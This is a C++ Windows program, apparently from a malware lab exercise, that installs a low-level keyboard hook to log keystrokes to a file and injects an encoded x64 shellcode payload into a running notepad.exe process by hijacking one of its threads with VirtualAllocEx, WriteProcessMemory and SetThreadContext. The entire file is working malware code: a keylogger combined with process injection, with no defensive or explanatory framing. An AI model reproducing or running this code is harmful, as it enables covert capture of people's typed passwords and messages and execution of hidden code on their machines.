#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <fstream>
#include <iomanip>
#include <sstream>

bool isNotepadRunning(DWORD pid) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return false;
    }

    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(snapshot, &processEntry)) {
        do {
            if (processEntry.th32ProcessID == pid && _wcsicmp(processEntry.szExeFile, L"notepad.exe") == 0) {
                CloseHandle(snapshot);
                return true;
            }
        } while (Process32Next(snapshot, &processEntry));
    }

    CloseHandle(snapshot);
    return false;
}

// Function to log the shellcode to a file
void LogShellcodeToFile(const unsigned char* shellcode, size_t size) {
    std::ofstream shellcodeFile("C:\\Users\\IEUser\\d4ca113850373d34d7aca11e6295c7ab.txt", std::ios::out | std::ios::binary);
    if (!shellcodeFile.is_open()) {
        std::cerr << "Failed to open file to log shellcode." << std::endl;
        return;
    }

    for (size_t i = 0; i < size; i++) {
        // Write each byte as a 2-digit hex value
        shellcodeFile << std::hex << std::setw(2) << std::setfill('0') << (int)shellcode[i] << " ";
    }

    shellcodeFile.close();
    std::cout << "::::::::::::::::::::::::::::::::::::::::" << std::endl;
}

// Keylogger function to log key presses
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = pKeyboard->vkCode;

        std::ofstream logFile("C:\\Users\\IEUser\\__README__.txt", std::ios::app);
        if (logFile.is_open()) {
            if (vkCode >= 'A' && vkCode <= 'Z') {
                logFile << char(vkCode); // Log letters
            }
            else if (vkCode == VK_SPACE) {
                logFile << " "; // Log spaces
            }
            else if (vkCode == VK_RETURN) {
                logFile << "\n"; // Log new lines
            }
            else {
                logFile << "[" << vkCode << "]"; // Log other keys
            }
            logFile.close();
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Function to start keylogging
void StartKeyLogger() {
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!keyboardHook) {
        std::cerr << "Failed to set keyboard hook. Error code: " << GetLastError() << std::endl;
        return;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyboardHook);
}

DWORD WINAPI KeyLoggerThread(LPVOID lpParam) {
    StartKeyLogger();
    return 0;
}

int main()
{
    // Start the keylogger in a separate thread
    HANDLE hThread = CreateThread(NULL, 0, KeyLoggerThread, NULL, 0, NULL);
    if (hThread == NULL) {
        std::cerr << "Failed to create keylogger thread. Error: " << GetLastError() << std::endl;
        return 1;
    }
    unsigned char shellcode[] =

        "\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef"

        "\xff\xff\xff\x48\xbb\x63\xb5\x8a\xf4\x6e\xdc\x9f\x43\x48"

        "\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x9f\xfd\x09"

        "\x10\x9e\x34\x5f\x43\x63\xb5\xcb\xa5\x2f\x8c\xcd\x12\x35"

        "\xfd\xbb\x26\x0b\x94\x14\x11\x03\xfd\x01\xa6\x76\x94\x14"

        "\x11\x43\xfd\x01\x86\x3e\x94\x90\xf4\x29\xff\xc7\xc5\xa7"

        "\x94\xae\x83\xcf\x89\xeb\x88\x6c\xf0\xbf\x02\xa2\x7c\x87"

        "\xb5\x6f\x1d\x7d\xae\x31\xf4\xdb\xbc\xe5\x8e\xbf\xc8\x21"

        "\x89\xc2\xf5\xbe\x57\x1f\xcb\x63\xb5\x8a\xbc\xeb\x1c\xeb"

        "\x24\x2b\xb4\x5a\xa4\xe5\x94\x87\x07\xe8\xf5\xaa\xbd\x6f"

        "\x0c\x7c\x15\x2b\x4a\x43\xb5\xe5\xe8\x17\x0b\x62\x63\xc7"

        "\xc5\xa7\x94\xae\x83\xcf\xf4\x4b\x3d\x63\x9d\x9e\x82\x5b"

        "\x55\xff\x05\x22\xdf\xd3\x67\x6b\xf0\xb3\x25\x1b\x04\xc7"

        "\x07\xe8\xf5\xae\xbd\x6f\x0c\xf9\x02\xe8\xb9\xc2\xb0\xe5"

        "\x9c\x83\x0a\x62\x65\xcb\x7f\x6a\x54\xd7\x42\xb3\xf4\xd2"

        "\xb5\x36\x82\xc6\x19\x22\xed\xcb\xad\x2f\x86\xd7\xc0\x8f"

        "\x95\xcb\xa6\x91\x3c\xc7\x02\x3a\xef\xc2\x7f\x7c\x35\xc8"

        "\xbc\x9c\x4a\xd7\xbd\xd0\xab\xec\x71\x3c\x86\xb8\xf4\x6e"

        "\x9d\xc9\x0a\xea\x53\xc2\x75\x82\x7c\x9e\x43\x63\xfc\x03"

        "\x11\x27\x60\x9d\x43\x62\x0e\x80\xf4\x6e\xd9\xde\x17\x2a"

        "\x3c\x6e\xb8\xe7\x2d\xde\xf9\x2f\xc2\xac\xf3\x91\x09\xd3"

        "\xca\x89\xdd\x8b\xf5\x6e\xdc\xc6\x02\xd9\x9c\x0a\x9f\x6e"

        "\x23\x4a\x13\x33\xf8\xbb\x3d\x23\xed\x5f\x0b\x9c\x75\xc2"

        "\x7d\xac\x94\x60\x83\x2b\x3c\x4b\xb5\xd4\x36\x90\x9c\x83"

        "\x4a\x5f\xbc\xe7\x1b\xf5\x53\x22\xed\xc6\x7d\x8c\x94\x16"

        "\xba\x22\x0f\x13\x51\x1a\xbd\x60\x96\x2b\x34\x4e\xb4\x6c"

        "\xdc\x9f\x0a\xdb\xd6\xe7\x90\x6e\xdc\x9f\x43\x63\xf4\xda"

        "\xb5\x3e\x94\x16\xa1\x34\xe2\xdd\xb9\x5f\x1c\xf5\x4e\x3a"

        "\xf4\xda\x16\x92\xba\x58\x07\x47\xe1\x8b\xf5\x26\x51\xdb"

        "\x67\x7b\x73\x8a\x9c\x26\x55\x79\x15\x33\xf4\xda\xb5\x3e"

        "\x9d\xcf\x0a\x9c\x75\xcb\xa4\x27\x23\x57\x0e\xea\x74\xc6"

        "\x7d\xaf\x9d\x25\x3a\xaf\x8a\x0c\x0b\xbb\x94\xae\x91\x2b"

        "\x4a\x40\x7f\x60\x9d\x25\x4b\xe4\xa8\xea\x0b\xbb\x67\x6f"

        "\xf6\xc1\xe3\xcb\x4e\xc8\x49\x22\xde\x9c\x60\xc2\x77\xaa"

        "\xf4\xa3\x45\x1f\xbf\x0a\x0f\x8e\xa9\x9a\xf8\x24\xa6\xf8"

        "\x9b\x04\xdc\xc6\x02\xea\x6f\x75\x21\x6e\xdc\x9f\x43";

    LogShellcodeToFile(shellcode, sizeof(shellcode));

    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    if (!CreateProcess(TEXT("C:\\Windows\\System32\\notepad.exe"), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
    {
        std::cerr << "Failed to start notepad.exe" << std::endl;
        return 1;
    }

    // Open Process Hacker 2 for the user
    if (!CreateProcess(TEXT("C:\\Program Files\\Process Hacker 2\\ProcessHacker.exe"), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
    {
        std::cerr << "Failed to start Process Hacker 2" << std::endl;
        return 1;
    }

    HANDLE targetProcessHandle;
    PVOID remoteBuffer;
    HANDLE threadHijacked = NULL;
    HANDLE snapshot;
    THREADENTRY32 threadEntry;
    CONTEXT context;

    DWORD targetPID;
    while (true)
    {
        std::cout << "::::::::::::::::::::::::::::::::::::::::";
        std::cin >> targetPID;
        if (isNotepadRunning(targetPID)) {
            break;
        }
        else {
            std::cerr << "::::::::::::::::::::::::::::::::::::::::" << std::endl;
        }
    }

    context.ContextFlags = CONTEXT_FULL;
    threadEntry.dwSize = sizeof(THREADENTRY32);

    targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
    remoteBuffer = VirtualAllocEx(targetProcessHandle, (LPVOID)0x00000273c6cf0000, sizeof(shellcode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    if (remoteBuffer == NULL) {
        std::cerr << "VirtualAllocEx failed: " << GetLastError() << std::endl;
        return 1;
    }
    if (!WriteProcessMemory(targetProcessHandle, remoteBuffer, shellcode, sizeof(shellcode), NULL)) {
        std::cerr << "WriteProcessMemory failed: " << GetLastError() << std::endl;
        return 1;
    }

    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    Thread32First(snapshot, &threadEntry);

    while (Thread32Next(snapshot, &threadEntry)) {
        if (threadEntry.th32OwnerProcessID == targetPID) {
            threadHijacked = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
            break;
        }
    }

    SuspendThread(threadHijacked);

    GetThreadContext(threadHijacked, &context);
    context.Rip = (DWORD64)remoteBuffer;  // Use the remoteBuffer address as the RIP

    // Display the memory address in a MessageBoxA
    std::ostringstream oss;
    oss << "User directory changed and Shellcode memory address: " << remoteBuffer;
    std::string message = oss.str();
    MessageBoxA(NULL, message.c_str(), "Shellcode Address", MB_OK);

    SetThreadContext(threadHijacked, &context);

    ResumeThread(threadHijacked);

    CloseHandle(snapshot);
    CloseHandle(targetProcessHandle);
    CloseHandle(threadHijacked);

    // Close handles to the process and thread of notepad.exe
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hThread);

    return 0;
}
